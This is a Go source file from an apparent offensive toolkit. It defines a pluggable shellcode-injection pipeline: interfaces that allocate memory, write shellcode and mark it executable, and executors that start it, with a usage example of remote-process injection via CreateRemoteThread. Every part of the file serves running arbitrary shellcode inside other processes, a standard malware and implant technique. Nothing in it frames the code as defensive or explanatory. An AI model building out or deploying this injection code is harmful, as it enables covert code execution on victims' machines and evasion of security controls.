package inject

import "fmt"

// MemorySetup handles the alloc → write → protect phase of injection.
// Implementations decide where (local vs remote) and how (WinAPI vs syscall).
type MemorySetup interface {
	// Setup allocates memory, writes shellcode, and sets PAGE_EXECUTE_READ.
	// Returns the base address of the executable shellcode.
	Setup(shellcode []byte) (addr uintptr, err error)
}

// Executor triggers shellcode execution at an address.
// Implementations choose the thread creation or hijacking strategy.
type Executor interface {
	// Execute starts execution of shellcode at addr.
	Execute(addr uintptr) error
}

// Pipeline composes a MemorySetup and an Executor into a complete
// injection flow. This is the Template Method pattern — the algorithm
// skeleton (validate → setup memory → execute) is fixed, while the
// concrete steps are pluggable.
//
// Example:
//
//	p := inject.NewPipeline(
//	    inject.RemoteMemory(hProcess, caller),
//	    inject.CreateRemoteThreadExecutor(hProcess, caller),
//	)
//	err := p.Inject(shellcode)
type Pipeline struct {
	memory   MemorySetup
	executor Executor
}

// NewPipeline creates an injection pipeline from a memory setup and executor.
func NewPipeline(memory MemorySetup, executor Executor) *Pipeline {
	return &Pipeline{memory: memory, executor: executor}
}

// Inject implements the Injector interface using the template method pattern:
// validate → setup memory → execute.
func (p *Pipeline) Inject(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	addr, err := p.memory.Setup(shellcode)
	if err != nil {
		return fmt.Errorf("memory setup: %w", err)
	}
	if err := p.executor.Execute(addr); err != nil {
		return fmt.Errorf("execute: %w", err)
	}
	return nil
}
